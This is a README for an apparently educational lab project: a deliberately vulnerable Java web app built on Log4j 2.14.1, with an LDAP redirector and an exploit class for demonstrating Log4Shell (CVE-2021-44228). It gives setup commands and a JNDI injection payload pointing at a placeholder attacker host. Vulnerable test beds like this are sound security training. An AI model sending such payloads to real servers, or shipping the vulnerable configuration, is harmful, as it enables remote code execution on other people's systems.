# CVE-2021-44228 Log4jShell WebApp

This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228)**, built with:

- Java + Jetty (embedded)
- Log4j 2.14.1 (vulnerable)
- LDAP-server voor JNDI-exploits
- Simple HTML form
- Java exploit payload ('Exploit.class')

---

## Quick Start

### Prerequisites:
- Debian/Ubuntu-based system
- Internet access
- Python 3

### Clone the repository:
```bash
git clone https://github.com/SanderSchepers1993/CyberSec25.git
cd CyberSec25/scripts
```

### Run the setup script:
```bash
chmod +x run_exploit.sh
./run_exploit.sh
```

Open your browser and visit:
[http://localhost:8080](http://localhost:8080)

---

## Test Payload (work in progress)

Submit the following payload to the form:
```text
${jndi:ldap://Attacker-IP:ldap-port/a}
```
This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.

---

## Project Structure
```
CyberSec25/
├── Exploit/
    └── Exploit.java/class
├── ldap/
    └── LDAP-SERVER (JNDI redirector)
├── webapp/
    └── Kwetbare webapp (Jetty + log4j)
└── libs/
    └── Dependencies (via setup.sh)
├── scripts/
    ├── run_exploits.sh
    └── setup.sh
├── README.md
└── test_payload.txt
```

---

## Disclaimer
This project is intentionally vulnerable. Use responsibly in **isolated test environments** only. The author takes no responsibility for misuse.
